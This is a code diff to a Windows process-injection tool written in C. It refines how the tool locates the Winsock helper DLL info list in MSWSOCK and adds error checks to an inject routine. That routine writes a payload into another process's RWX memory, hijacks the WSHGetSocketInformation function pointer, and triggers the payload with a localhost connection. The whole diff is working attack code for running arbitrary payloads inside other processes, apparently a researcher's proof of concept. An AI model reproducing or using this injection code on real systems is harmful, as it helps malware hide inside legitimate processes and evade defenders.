@@ -80,6 +80,20 @@ typedef struct _WSHINFO_T {
 // Relative Virtual Address to Virtual Address
 #define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)
 
+// returns TRUE if ptr is heap
+BOOL IsHeapPtr(LPVOID ptr) {
+    MEMORY_BASIC_INFORMATION mbi;
+    DWORD                    res;
+    
+    // query the pointer
+    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
+    if(res != sizeof(mbi)) return FALSE;
+
+    return ((mbi.State   == MEM_COMMIT    ) &&
+            (mbi.Type    == MEM_PRIVATE   ) && 
+            (mbi.Protect == PAGE_READWRITE));
+}
+
 // calculate the RVA of Socket Helpder DLL LIST_ENTRY in MSWSOCK data section
 DWORD GetSockHelperDllListHeadRVA(VOID) {
     WSADATA                  wsa;
@@ -116,27 +130,24 @@ DWORD GetSockHelperDllListHeadRVA(VOID) {
       le = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
          
       for(j=0; j<(sh[i].Misc.VirtualSize/sizeof(ULONG_PTR)); j++) {
-        // query the pointer
-        res = VirtualQuery((LPVOID)le[j], &mbi, sizeof(mbi));
-        if(res != sizeof(mbi)) continue;
-          
-        // if it points to the heap, assume it points to WINSOCK_HELPER_DLL_INFO entry
-        if((mbi.State   != MEM_COMMIT    ) &&
-           (mbi.Type    != MEM_PRIVATE   ) && 
-           (mbi.Protect != PAGE_READWRITE)) continue;
+        // skip if not a pointer to heap memory
+        if(!IsHeapPtr((LPVOID)le[j])) continue;
           
         PLIST_ENTRY list = (PLIST_ENTRY)&le[j];
-          
-        // if this pointer is a LIST_ENTRY with Flink equal to Blink
-        if(list->Flink == list->Blink) {
-          // assume it's a winsock helpder dll info structure
-          hdi = (PWINSOCK_HELPER_DLL_INFO)list->Flink;
-          // if two api match 
-          if(hdi->WSHOpenSocket  == (LPVOID)GetProcAddress(m, "Tcpip4_WSHOpenSocket") &&
-             hdi->WSHOpenSocket2 == (LPVOID)GetProcAddress(m, "Tcpip4_WSHOpenSocket2")) {
-            // return the RVA
-            rva = sh[i].VirtualAddress + j * sizeof(ULONG_PTR);
-          }
+        
+        // skip if not equal
+        if(list->Flink != list->Blink) continue;
+        
+        // skip if list doesn't contain pointers to heap
+        if(!IsHeapPtr(list->Flink) && !IsHeapPtr(list->Blink)) continue;
+        
+        // assume it's a winsock helpder dll info structure
+        hdi = (PWINSOCK_HELPER_DLL_INFO)list->Flink;
+        // if two api match 
+        if(hdi->WSHOpenSocket  == (LPVOID)GetProcAddress(m, "Tcpip4_WSHOpenSocket") &&
+          hdi->WSHOpenSocket2 == (LPVOID)GetProcAddress(m, "Tcpip4_WSHOpenSocket2")) {
+          // return the RVA
+          rva = sh[i].VirtualAddress + j * sizeof(ULONG_PTR);
         }
       }
     }
@@ -563,36 +574,40 @@ VOID inject(DWORD pid, WORD port, LPVOID payload, DWORD payloadSize) {
       
       cs = VirtualAllocEx(hp, NULL, payloadSize,
           MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-      WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+      if(cs != NULL) {
+        if(WriteProcessMemory(hp, cs, payload, payloadSize, &wr)) {
       
-      // 4. Update the function pointer with pointer to payload
-      WriteProcessMemory(
-        hp, 
-        (PBYTE)addr + offsetof(WINSOCK_HELPER_DLL_INFO, WSHGetSocketInformation),
-        &cs,
-        sizeof(ULONG_PTR), 
-        &wr);
-
-      // 5. Trigger it with connection to the port on localhost
-      sin.sin_family      = AF_INET;
-      sin.sin_port        = htons(port);
-      sin.sin_addr.s_addr = inet_addr("127.0.0.1");
-      
-      connect(s, (struct sockaddr*)&sin, sizeof(sin));
-      
-      // wait a moment before restoring pointer
-      Sleep(10);
-      
-      // 6. Restore function pointer and clean up
-      WriteProcessMemory(
-        hp, 
-        (PBYTE)addr + offsetof(WINSOCK_HELPER_DLL_INFO, WSHGetSocketInformation),
-        &hdi.WSHGetSocketInformation,
-        sizeof(ULONG_PTR), 
-        &wr);
-        
-      VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
-      closesocket(s);        
+          // 4. Update the function pointer with pointer to payload
+          if(WriteProcessMemory(
+            hp, 
+            (PBYTE)addr + offsetof(WINSOCK_HELPER_DLL_INFO, WSHGetSocketInformation),
+            &cs,
+            sizeof(ULONG_PTR), 
+            &wr)) 
+          {
+            // 5. Trigger it with connection to the port on localhost
+            sin.sin_family      = AF_INET;
+            sin.sin_port        = htons(port);
+            sin.sin_addr.s_addr = inet_addr("127.0.0.1");
+            
+            if(connect(s, (struct sockaddr*)&sin, sizeof(sin)) == 0) {
+              printf("Injection completed.\n");              
+              // wait a moment before restoring pointer
+              Sleep(10);
+            } else printf("Unable to connect to service.\n");
+            
+            // 6. Restore function pointer and clean up
+            WriteProcessMemory(
+              hp, 
+              (PBYTE)addr + offsetof(WINSOCK_HELPER_DLL_INFO, WSHGetSocketInformation),
+              &hdi.WSHGetSocketInformation,
+              sizeof(ULONG_PTR), 
+              &wr);
+          } else printf("Unable to update function pointer.\n");
+        } else printf("Unable to deploy payload.\n");
+        VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+        closesocket(s);
+      } else printf("Unable to allocate RWX memory.\n");        
     } else {
       printf("Unable to find WINSOCK_HELPER_DLL_INFO entry.\n");
     }
